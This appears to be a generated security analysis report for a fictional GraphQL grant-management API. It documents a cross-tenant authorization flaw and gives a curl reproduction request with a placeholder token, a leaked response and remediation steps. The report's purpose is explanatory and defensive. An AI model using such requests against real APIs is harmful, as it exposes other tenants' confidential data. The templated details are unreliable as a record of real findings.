# Security Analysis Report
**System:** GrantFlow CRM API
**Domain:** Non-Profit / Grant Management
**Example ID:** GQL-0327
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.1 | GraphQL single-endpoint vulnerability — all operations (including sensitive mutations) are accessible at one URL with missing per-operation authorization; attacker reads cross-tenant grant record via `getResource` |

---

## Finding 1 — Platform: GraphQL Single-Endpoint Vulnerability (Pattern 9.1)

### Summary
The GraphQL API on GrantFlow CRM API (`api.grantflow-crm-api.example.com`) uses a single endpoint (`POST /graphql`) for all operations. Per §5.0 Pattern 9.1, the single-endpoint design means all operations — queries and mutations, including sensitive ones — are accessible at the same URL with no per-operation authorization controls. The `getResource` resolver lacks a `tenantId` JWT cross-check, allowing an attacker with `tenant-9df8` credentials to access resource `R-2327` belonging to `tenant-07fd`.

**Note:** HAR operation `getResource` and response key `getResource` are consistent in this example.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of grant records.

**Pattern:** 9.1 — GraphQL: single endpoint vulnerabilities (Platform)
**Affected resolver:** `getResource`
**Affected endpoint:** `POST https://api.grantflow-crm-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.grantflow-crm-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-9df8

{"query": "query VulnerableOp { getResource(id: \"R-2327\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Grant Record Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-07fd",
      "ownerId": "other-user-9df807fd",
      "data": {
        "sensitiveField": "CONFIDENTIAL-9df807fd",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-9df8`. Returned data belongs to: `tenant-07fd`. Cross-tenant grant management data exposure confirmed.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.grantflow-crm-api.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-9df8" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2327\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: returns tenant-07fd grant record — cross-tenant access via single-endpoint succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. Implement per-operation authorization middleware — each resolver must independently verify `jwt.tenantId` against the record's `tenantId`.
2. Consider operation allowlisting per role/scope at the API gateway level.
3. Re-key Redis cache to include `tenantId`.
